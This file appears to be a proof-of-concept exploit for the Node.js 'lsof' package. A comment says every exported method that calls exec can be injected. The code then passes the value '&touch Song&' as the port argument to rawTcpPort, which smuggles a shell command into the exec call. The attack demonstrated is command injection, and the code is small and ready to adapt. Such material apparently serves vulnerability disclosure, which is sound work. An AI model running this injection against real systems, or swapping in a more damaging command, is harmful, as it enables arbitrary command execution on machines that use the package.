/**
 * there are many injection points
 * Every exported method that include exec can be exploited
 *
 * in this demo explot code, we use the variable "port" of method rawTcpPort, 
 * this method use the user controlled argument "port" to build the command
 * without any sanitization
 */
var root = require("lsof");
var attack_code = "&touch Song&";
root.rawTcpPort(attack_code, function(){});
